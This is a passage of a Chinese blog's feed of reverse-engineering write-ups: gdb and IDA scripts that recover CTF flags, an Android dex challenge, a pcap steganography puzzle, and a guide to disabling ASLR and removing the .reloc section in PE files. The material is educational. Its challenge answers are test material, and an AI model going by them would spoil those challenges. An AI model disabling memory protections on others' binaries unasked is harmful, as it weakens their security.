class="number">57</span>)</span><br><span class="line">a[i] -= <span class="number">48</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">a[i] -= <span class="number">87</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(a[i+<span class="number">1</span>] &gt;= <span class="number">48</span> &amp;&amp; a[i+<span class="number">1</span>] &lt;= <span class="number">57</span>)</span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">48</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">87</span>;</span><br><span class="line"></span><br><span class="line">value = a[i+<span class="number">1</span>] | a[i]*<span class="number">16</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(result[j] == value)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, j);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200528122051072-1591167097050.png" alt="image-20200528122051072"></p></li><li><p>做完去看了看网上的 writeup， 发现都是用gdb写脚本搞的，然后去学习了下。</p></li><li><p>使用 gdb的 define 命令可以定义一系列的gdb指令。首先找到要下断点地址，这个在ida中很容易。</p><p>这里有2中方法，执行gdb脚本，一：直接输入defien命令，输入指令，最后执行。二：单独写成一个脚本文件使用 source 来执行。</p></li><li><p>这里直接写的脚本文件使用 source执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>($i&lt;$total)</span><br><span class="line">  b *<span class="number">0x80485b4</span></span><br><span class="line">  b *<span class="number">0x8048707</span></span><br><span class="line">  run T</span><br><span class="line">  set $i=$i+<span class="number">1</span></span><br><span class="line">  set *(char*)($ebp<span class="number">-0xc</span>)=$i</span><br><span class="line">  <span class="keyword">continue</span></span><br><span class="line">  <span class="keyword">if</span> ($eax==<span class="number">0x95</span>)</span><br><span class="line">    <span class="keyword">print</span> $i</span><br><span class="line">    x/<span class="number">127</span>xb $esp+<span class="number">0x1c</span>  <span class="comment">#这里有一个知识点,最后总结。</span></span><br><span class="line">    set $i=<span class="number">256</span></span><br><span class="line">  stop</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200528163112618-1591167101638.png" alt="image-20200528163112618"></p></li><li><p>因为可打印字符的ASCII：32-127，所以我们打印出前128个数据即可。最后解密。python确实方便，各种方法直接调用即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">list =  [<span class="number">0xd6</span>,<span class="number">0xc9</span>,<span class="number">0xc2</span>,<span class="number">0xce</span>,<span class="number">0x47</span>,<span class="number">0xde</span>,<span class="number">0xda</span>,<span class="number">0x70</span></span><br><span class="line">,<span class="number">0x85</span>,<span class="number">0xb4</span>,<span class="number">0xd2</span>,<span class="number">0x9e</span>,<span class="number">0x4b</span>,<span class="number">0x62</span>,<span class="number">0x1e</span>,<span class="number">0xc3</span></span><br><span class="line">,<span class="number">0x7f</span>,<span class="number">0x37</span>,<span class="number">0x7c</span>,<span class="number">0xc8</span>,<span class="number">0x4f</span>,<span class="number">0xec</span>,<span class="number">0xf2</span>,<span class="number">0x45</span></span><br><span class="line">,<span class="number">0x18</span>,<span class="number">0x61</span>,<span class="number">0x17</span>,<span class="number">0x1a</span>,<span class="number">0x29</span>,<span class="number">0x11</span>,<span class="number">0xc7</span>,<span class="number">0x75</span></span><br><span class="line">,<span class="number">0x02</span>,<span class="number">0x48</span>,<span class="number">0x26</span>,<span class="number">0x93</span>,<span class="number">0x83</span>,<span class="number">0x8a</span>,<span class="number">0x42</span>,<span class="number">0x79</span></span><br><span class="line">,<span class="number">0x81</span>,<span class="number">0x10</span>,<span class="number">0x50</span>,<span class="number">0x44</span>,<span class="number">0xc4</span>,<span class="number">0x6d</span>,<span class="number">0x84</span>,<span class="number">0xa0</span></span><br><span class="line">,<span class="number">0xb1</span>,<span class="number">0x72</span>,<span class="number">0x96</span>,<span class="number">0x76</span>,<span class="number">0xad</span>,<span class="number">0x23</span>,<span class="number">0xb0</span>,<span class="number">0x2f</span></span><br><span class="line">,<span class="number">0xb2</span>,<span class="number">0xa7</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0x5e</span>,<span class="number">0x92</span>,<span class="number">0x07</span>,<span class="number">0xc0</span></span><br><span class="line">,<span class="number">0xbc</span>,<span class="number">0x36</span>,<span class="number">0x99</span>,<span class="number">0xaf</span>,<span class="number">0xae</span>,<span class="number">0xdb</span>,<span class="number">0xef</span>,<span class="number">0x15</span></span><br><span class="line">,<span class="number">0xe7</span>,<span class="number">0x8e</span>,<span class="number">0x63</span>,<span class="number">0x06</span>,<span class="number">0x9c</span>,<span class="number">0x56</span>,<span class="number">0x9a</span>,<span class="number">0x31</span></span><br><span class="line">,<span class="number">0xe6</span>,<span class="number">0x64</span>,<span class="number">0xb5</span>,<span class="number">0x58</span>,<span class="number">0x95</span>,<span class="number">0x49</span>,<span class="number">0x04</span>,<span class="number">0xee</span></span><br><span class="line">,<span class="number">0xdf</span>,<span class="number">0x7e</span>,<span class="number">0x0b</span>,<span class="number">0x8c</span>,<span class="number">0xff</span>,<span class="number">0xf9</span>,<span class="number">0xed</span>,<span class="number">0x7a</span></span><br><span class="line">,<span class="number">0x65</span>,<span class="number">0x5a</span>,<span class="number">0x1f</span>,<span class="number">0x4e</span>,<span class="number">0xf6</span>,<span class="number">0xf8</span>,<span class="number">0x86</span>,<span class="number">0x30</span></span><br><span class="line">,<span class="number">0xf0</span>,<span class="number">0x4c</span>,<span class="number">0xb7</span>,<span class="number">0xca</span>,<span class="number">0xe5</span>,<span class="number">0x89</span>,<span class="number">0x2a</span>,<span class="number">0x1d</span></span><br><span class="line">,<span class="number">0xe4</span>,<span class="number">0x16</span>,<span class="number">0xf5</span>,<span class="number">0x3a</span>,<span class="number">0x27</span>,<span class="number">0x28</span>,<span class="number">0x8d</span>,<span class="number">0x40</span></span><br><span class="line">,<span class="number">0x09</span>,<span class="number">0x03</span>,<span class="number">0x6f</span>,<span class="number">0x94</span>,<span class="number">0xa5</span>,<span class="number">0x4a</span>,<span class="number">0x46</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">s = <span class="string">"95eeaf95ef94234999582f722f492f72b19a7aaf72e6e776b57aee722fe77ab5ad9aaeb156729676ae7a236d99b1df4a"</span>;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">2</span>):</span><br><span class="line">    s1 = int(s[i:i+<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">    flag += chr(list.index(s1))</span><br><span class="line"><span class="keyword">print</span> (flag)</span><br></pre></td></tr></table></figure></li><li><p><strong>总结：这道题收获还是很大。1：对ida中汇编语言的解读更熟悉了些，注意各种 al 取最低字节数据。 2：ror指令的了解，及对他的C语言用法：如 <code>ror a，3</code> 那C语言为：<code>((a&gt;&gt;3）| ((a&amp;7) &lt;&lt; 5))</code>。 3：使用gdb写脚本。</strong></p><blockquote><p><strong>gdb脚本中的 查看内存内容的方法：x/&lt;n/f/u&gt; <addr>     n、f、u是可选的参数。</addr></strong></p><p><strong>n：显示的内存单元的个数，f：表示显示的格式，其中：s：字符串显示，x：按十六进制格式显示，d：按十进制格式显示变量</strong></p><p><strong>u：按十六进制格式显示无符号整型，t：按二进制格式显示， o：按八进制格式显示，c：按字符格式显示变量。</strong></p><p><strong>最后的u表示每个单元的大小，其中：b表示单字节，h表示双字节，w表示四字 节，g表示八字节。</strong></p><p><strong>那上面脚本写的 x/127xb  表示将 127个的单字节单元的数据按16进制格式显示出来。</strong></p></blockquote></li></ul><hr><h2 id="What-does-this-button-do"><a href="#What-does-this-button-do" class="headerlink" title="What-does-this-button-do"></a>What-does-this-button-do</h2><blockquote><p>很简单的一道安卓逆向，为什么分数那么高。。。</p></blockquote><ul><li><p>下载解压后得到一堆文件，对安卓逆向没深入了解过，直接找到 .dex文件，使用强大的 ApkToolkit 工具转 .dex文件为 .jar文件。</p></li><li><p>接着就是使用 jd-gui 打开，看反编译的java代码。</p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200530123951599-1591167111011.png" alt="image-20200530123951599"></p></li><li><p>看 FlagActivity.class，就是直接取出flag。</p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200530124201413-1591167113886.png" alt="image-20200530124201413"></p></li><li><p>打印出来就好了。flag: <strong>flag{w4nn4_j4r_my_d3x}</strong></p></li><li><p><strong>总结：安卓逆向也是遇到一道，然后做来试试看，但也只能做很简单的，暂时熟悉工具吧。</strong></p></li></ul><hr><h2 id="re5-packed-movement"><a href="#re5-packed-movement" class="headerlink" title="re5-packed-movement"></a>re5-packed-movement</h2><blockquote><p>对于全是mov指令，这道题看了writeup做的，学习了ida中脚本的使用。</p></blockquote><ul><li><p>32位elf文件加了upx壳，直接使用 upx -d。</p></li><li><p>打开全是mov指令，心想这又是什么骚操作，一波操作后还是不会。后面发现都是用ida脚本实现，那其实也可以用gdb脚本。</p></li><li><p>学习一番ida脚本及idc的语法，开始做题。先找到代码段地址，因为考虑flag是通过立即数mov指令赋值的。</p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200602151634347.png" alt="image-20200602151634347"></p></li><li><p>写脚本搜索四个字节的所有可打印字符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">start=<span class="number">0x0804829C</span></span><br><span class="line">end=<span class="number">0x08060B3A</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> start&lt;end:</span><br><span class="line">    <span class="keyword">if</span> (Byte(start) &lt;= ord(<span class="string">'9'</span>) <span class="keyword">and</span> Byte(start)&gt;=ord(<span class="string">'0'</span>)) <span class="keyword">or</span> (Byte(start)&lt;=ord(<span class="string">'z'</span>) <span class="keyword">and</span>                 Byte(start)&gt;=ord(<span class="string">'a'</span>)) <span class="keyword">or</span> (Byte(start)&lt;=ord(<span class="string">'Z'</span>) <span class="keyword">and</span> Byte(start)&gt;=ord(<span class="string">'A'</span>)) <span class="keyword">or</span> </span><br><span class="line">      (Byte(start) == ord(<span class="string">'&#125;'</span>)) <span class="keyword">or</span> (Byte(start) == ord(<span class="string">'&#123;'</span>)) <span class="keyword">or</span> (Byte(start) == ord(<span class="string">'_'</span>)) <span class="keyword">or</span> </span><br><span class="line">      (Byte(start) == ord(<span class="string">'@'</span>)) <span class="keyword">or</span> (Byte(start) == ord(<span class="string">'!'</span>)) <span class="keyword">or</span> (Byte(start) == ord(<span class="string">'#'</span>)) <span class="keyword">or</span>     (Byte(start) == ord(<span class="string">'&amp;'</span>)) <span class="keyword">or</span> (Byte(start) == ord(<span class="string">'*'</span>)):</span><br><span class="line">        <span class="keyword">if</span> Byte(start) <span class="keyword">and</span> (Byte(start+<span class="number">1</span>)==<span class="number">0</span>) <span class="keyword">and</span> (Byte(start+<span class="number">2</span>)==<span class="number">0</span>) <span class="keyword">and</span> (Byte(start+<span class="number">3</span>)==<span class="number">0</span>):</span><br><span class="line">            print(chr(Byte(start)))</span><br><span class="line">            flag += chr(Byte(start))</span><br><span class="line">    start += <span class="number">1</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></li><li><p>执行。</p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200602154318790.png" alt="image-20200602154318790"></p></li><li><p><strong>总结：对ida脚本进行了学习，开始对ida执行脚本有所了解。</strong></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;攻防世界刷题记录（4）。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Reverse" scheme="https://www.Bxnop.cn/categories/Reverse/"/>
    
    
  </entry>
  
  <entry>
    <title>论剑场</title>
    <link href="https://www.bxnop.cn/2020/05/12/%E8%AE%BA%E5%89%91%E5%9C%BA/"/>
    <id>https://www.bxnop.cn/2020/05/12/%E8%AE%BA%E5%89%91%E5%9C%BA/</id>
    <published>2020-05-12T11:15:32.000Z</published>
    <updated>2020-09-17T14:41:53.506Z</updated>
    
    <content type="html"><![CDATA[<p>论剑场刷题记录。<a id="more"></a></p><h2 id="Refresh-it"><a href="#Refresh-it" class="headerlink" title="Refresh it"></a>Refresh it</h2><ul><li><p>题目下载下来是一个.pcapng文件. 先用010editor看了看会不会只是简单的将文件格式改了, 因为是reverse题, 看了一圈, 的却是流量包.</p></li><li><p>在wireshark中尝试搜索了题目关键字refresh, 没有得到有用信息. 又接着尝试了搜索了很多, 都无果. </p></li><li><p>转到foremost和binwalk看看没有什么隐藏文件.  确实看到了2张图片, 提取出来但打不开, 考虑exe文件隐藏在图片文件中, 查看了图片文件信息, PE文件的影子都没有🤣.  没办法了, 题目先放一段时间. </p></li><li><p>这又是过了几天来看这个题目, 感觉自己找不到目标, 在盲目的找…很多办法都试了下. 唯一得到的就是图片.</p></li><li><p>看了看图片信息, 发现F5 refrehsh. 又从题目的信息, 你看到刷新按钮了嘛. 突然想到之前做过一个杂项题是F5-steganography隐写. 后面那个的refresh猜测是密码. 连忙去试了下, 错误…. 但是这个确实很像是考隐写.<img src="/2020/05/12/%E8%AE%BA%E5%89%91%E5%9C%BA/image-20200512194627578.png" alt="image-20200512194627578"></p></li><li><p>考虑是binwalk提取图片有损坏或者不全的原因, 因为图片是打不开的.  又跑去wireshark. 因为这次明确是找图片, 直接搜索了 jpg, 果然出现了个图片<img src="/2020/05/12/%E8%AE%BA%E5%89%91%E5%9C%BA/image-20200512200418460.png" alt="image-20200512200418460"></p></li><li><p>追踪tcp流把图片的二进制代码复制下来, winhex重建一个文件粘贴保存.注意文件头FF D8 文件尾 FF D9<img src="/2020/05/12/%E8%AE%BA%E5%89%91%E5%9C%BA/image-20200512200649037.png" alt="image-20200512200649037"></p></li><li><p>这次图片可以打开了, 是个刷新按钮, 再次去用F5隐写来解密. 终于成功了….</p><p><img src="/2020/05/12/%E8%AE%BA%E5%89%91%E5%9C%BA/image-20200512200849581.png" alt="image-20200512200849581"></p></li><li><p><strong>总结: 感觉花了很多时间, 简直就是杂项题啊. 另外题的提示信息太少. 熟悉了一些工具的使用吧</strong></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;论剑场刷题记录。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Reverse" scheme="https://www.Bxnop.cn/categories/Reverse/"/>
    
    
  </entry>
  
  <entry>
    <title>ASLR</title>
    <link href="https://www.bxnop.cn/2020/05/12/ASLR/"/>
    <id>https://www.bxnop.cn/2020/05/12/ASLR/</id>
    <published>2020-05-12T04:15:30.000Z</published>
    <updated>2020-07-28T07:19:12.733Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>开始是一道CTF题加了UPX壳,  利用堆栈平衡脱壳,import rec进行IAT修复后,程序不能正常打开了.  后来才知道是开启了ASLR, 关闭后即可打开。 加壳会对PE文件的重定位表进行压缩,在OD直接dump出的程序是丢失重定位表的, 而程序又是开启了ASLR,那程序自然会访问到无效的地址而打不开</strong></p></blockquote><a id="more"></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>ASLR(地址空间布局随机化), 一种针对缓冲区溢出的安全保护技术. 从Windows Vsita(内核版本<strong>6.0</strong>)开始采用, 而Windows XP的内核版本是<strong>5.1</strong>, 所以我们在Windows XP下脱开启了ASLR 的壳是不会有这个问题的.</p><p>ASLR就是使我们的PE文件在每次载入内存时起始地址都会变得随机化, 增加恶意用户编写漏洞利用代码的难度(<strong>在之前我们知道只有dll文件在理想地址空间被占用了才会进行重定位</strong>)</p><p>对于ASLR功能我们系统(win10)是默认关闭的, 我们可以在设置的安全中心打开.<img src="/2020/05/12/ASLR/image-20200511184233641-1589256958059.png" alt="image-20200511184233641"></p><p>另外就是可执行文件的ASLR, 我们在我们的编译器上也可以选择是否引用该功能.<img src="/2020/05/12/ASLR/image-20200511185012962-1589256958060.png" alt="image-20200511185012962"></p><h2 id="分析ASLR"><a href="#分析ASLR" class="headerlink" title="分析ASLR"></a>分析ASLR</h2><p>以VS编译器写一个程序, 分别生成开启了随机基址与未开启的的版本来分析. (<strong>一共有三个地方不同</strong>)</p><p><strong>(1)</strong>未开启ASLR的程序的<strong>文件头的Characteristics</strong>会多一个 <strong>IMAGE_FILE_RELOCS_STRIPPED   0X0001</strong> 的属性, 经过查看官方文档可以看得到属性解释, 所以我们开启ASLRd的程序不会有这个属性<img src="/2020/05/12/ASLR/image-20200511200244008-1589256958060.png" alt="image-20200511200244008"></p><p>​    下面看程序对比:</p><p><img src="/2020/05/12/ASLR/image-20200511201513817-1589256958060.png" alt="image-20200511201513817"></p><p><strong>(2)</strong>开启了ASLR的程序的<strong>可选头的DllCharacteristics</strong>多了<strong>IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE</strong></p><p><strong>0X0040</strong>的属性. 同样查看官方文档. 即重定位时需要的属性.<img src="/2020/05/12/ASLR/image-20200511201801401-1589256958060.png" alt="image-20200511201801401"></p><p>程序对比:<img src="/2020/05/12/ASLR/image-20200511202308748-1589204427416-1589204437657-1589256958060.png" alt="image-20200511202308748"></p><p><strong>(3)</strong>开启了ASLR的程序会多一个 <strong>.reloc</strong> 节(一般普通的exe文件是不需要该节的, 用于开启ASLR的程序进行重定位, 当然我们关闭了ASLR也可以把这个节删了)<img src="/2020/05/12/ASLR/image-20200511202858464-1589256958060.png" alt="image-20200511202858464"></p><h2 id="关闭ASLR"><a href="#关闭ASLR" class="headerlink" title="关闭ASLR"></a>关闭ASLR</h2><p>由上面的分析知道有3处不同, 其中上面的<strong>(1)</strong>中是开启了ASLR的程序少了 <strong>IMAGE_FILE_RELOCS_STRIPPED   0X0001</strong>属性, 我们增加上这个属性即可关闭ASLR(即 <strong>0102 -&gt; 0103</strong> / <strong>对应属性打上勾即可</strong>).    另外<strong>(2)</strong>中是多了<strong>DLL can move</strong>的属性,删除这个属性,同样可以关闭ASLR(即 <strong>8140 -&gt; 8100</strong> / <strong>对应属性取消打勾即可</strong> )</p><p>下面示例在010编译器中修改数值来关闭ASLR.<img src="/2020/05/12/ASLR/image-20200511204613644-1589256958060.png" alt="image-20200511204613644"></p><blockquote><p><strong>以上是关于ASLR的分析即关闭, 如果开启了ASLR, 我们在脱壳之前还是先关闭它最好,也方便调试时IDA与OD中地址的对应(如果只是想地址对应, 也可以在IDA中启动时把Manual load勾上, 手动输入加载的基地址即可),  既然关闭了ASLR, 那多出的.reloc节也就没用了, 下面手动删除该节区(虽然有很多工具可以直接实现, 还是手动熟悉下PE结构)</strong></p></blockquote><h2 id="删除-reloc节区"><a href="#删除-reloc节区" class="headerlink" title="删除.reloc节区"></a>删除.reloc节区</h2><p>首先每个节都对应一个节区头的, 那先从节区头开始. 使用010editor可以轻松在最后一节区头找到.  我们将其全部用0覆盖填充即可.(注: 不能直接删除了, 不然PE文件的很多属性会对应不上)<img src="/2020/05/12/ASLR/image-20200511205903649-1589256958060.png" alt="image-20200511205903649"></p><p>下面删除.reloc整个节区(一般这个节区都是新加的,所以在最后, 我们只要找到偏移地址直接删除到最后即可), 如图, 直接删除到最后即可. (这里的Size: 600h, 下面有用)<img src="/2020/05/12/ASLR/image-20200511210742225-1589256958060.png" alt="image-20200511210742225"></p><p>删除完后, 我们知道PE文件头的<strong>_IMAGE_FILE_HEADER</strong>的<strong>NumberOfSections</strong>的值一定要严格的与实际节区对应, 所以去修改 <strong>_IMAGE_FILE_HEADER</strong>的<strong>NumberOfSections</strong>使其减一.<img src="/2020/05/12/ASLR/image-20200511210943674-1589256958060.png" alt="image-20200511210943674">)<img src="/2020/05/12/ASLR/image-20200511211434269-1589256958060.png" alt="image-20200511211434269"></p><p>最后还有修改一个属性, 就是PE文件头 <strong>_IMAGE_OPTIONAL_HEADER</strong></p><p>的<strong>SizeOfImage</strong>, 修改为减去 .reloc节区后的大小  从上面我们知道.reloc大小是600h, 而该PE文件<strong>SectionAlignment(节在内存中的最小单位 (对齐单位) 一般为: 1000h)为1000h</strong>, 1000h &gt; 600h. 以1000h对齐, 所以我们直接将<strong>SizeOfImage</strong>减去1000h即可.<img src="/2020/05/12/ASLR/image-20200511211537176-1589256958060.png" alt="image-20200511211537176">)<img src="/2020/05/12/ASLR/image-20200511212159056-1589256958060.png" alt="image-20200511212159056"></p><blockquote><p>如果想增加一个节区, 也可以使用同样的方法</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;开始是一道CTF题加了UPX壳,  利用堆栈平衡脱壳,import rec进行IAT修复后,程序不能正常打开了.  后来才知道是开启了ASLR, 关闭后即可打开。 加壳会对PE文件的重定位表进行压缩,在OD直接dump出的程序是丢失重定位表的, 而程序又是开启了ASLR,那程序自然会访问到无效的地址而打不开&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="PE" scheme="https://www.Bxnop.cn/categories/PE/"/>
    
    
      <category term="系统" scheme="https://www.Bxnop.cn/tags/%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
</feed>
